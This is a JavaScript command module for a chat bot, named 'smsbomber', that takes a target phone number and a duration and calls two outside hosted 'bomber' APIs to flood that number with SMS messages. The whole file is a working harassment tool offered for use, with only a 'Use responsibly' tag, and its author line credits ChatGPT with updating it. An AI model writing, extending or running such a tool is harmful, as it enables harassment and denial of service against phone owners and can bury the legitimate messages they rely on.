const axios = require("axios");

module.exports = {
  config: {
    name: "smsbomber",
    version: "1.0.3",
    author: "vernex + updated by ChatGPT",
    description: "Send a large number of SMS to a target phone number using two fallback APIs",
    cooldowns: 10,
    dependencies: {
      axios: ""
    }
  },

  run: async function ({ api, event, args }) {
    const { threadID, messageID } = event;

    if (!args[0] || !args[1]) {
      return api.sendMessage(
        "📤 Usage:\n/smsbomber [phone_number] [amount_in_seconds]\n\nExample:\n/smsbomber 09503596043 10",
        threadID,
        messageID
      );
    }

    const phone = args[0];
    const amount = parseInt(args[1]);

    if (isNaN(amount) || amount <= 0 || amount > 60) {
      return api.sendMessage("❌ Invalid amount. Please enter a number between 1 and 30.", threadID, messageID);
    }

    try {
      await api.sendMessage(
        `📡 Bombing ${phone} for ${amount} seconds...`,
        threadID,
        messageID
      );

      const api1 = `https://haji-mix.up.railway.app/api/smsbomber?phone=${encodeURIComponent(phone)}&times=${amount}`;
      const api2 = `https://smsbomb-nethws3.up.railway.app/bomb?number=${encodeURIComponent(phone)}&seconds=${amount}`;

      let response;
      let usedApi = '';
      let resultMsg = '';

      // Try API 1
      try {
        response = await axios.get(api1);
        const data = response.data;

        if (data.status !== false) {
          usedApi = 'API 1 (Haji Mix)';
          resultMsg = `
════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 』════

📞 Target: ${phone}
📨 Amount: ${amount} SMS
✅ Status: Success
🌐 API Used: ${usedApi}

> Use responsibly.
          `.trim();
          return api.sendMessage(resultMsg, threadID, messageID);
        }
      } catch (err1) {
        console.warn("⚠️ API 1 failed:", err1.message);
      }

      // Try API 2 if API 1 failed
      try {
        response = await axios.get(api2);
        const data = response.data;

        if (data.message && data.message.toLowerCase().includes("success")) {
          usedApi = 'API 2 (NetHWS3)';
          resultMsg = `
════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 』════

📞 Target: ${data.number}
⏱ Duration: ${data.seconds}
✅ Status: ${data.message}
🌐 API Used: ${usedApi}

> Use responsibly.
          `.trim();
          return api.sendMessage(resultMsg, threadID, messageID);
        } else {
          return api.sendMessage(`❌ API 2 response: ${data.message || "Unknown error"}`, threadID, messageID);
        }
      } catch (err2) {
        console.warn("⚠️ API 2 failed:", err2.message);
      }

      return api.sendMessage(`❌ Both APIs failed. Please try again later.`, threadID, messageID);
    } catch (error) {
      console.error("❌ Unexpected Error:", error.message);
      return api.sendMessage(`❌ Error: ${error.message}`, threadID, messageID);
    }
  }
};
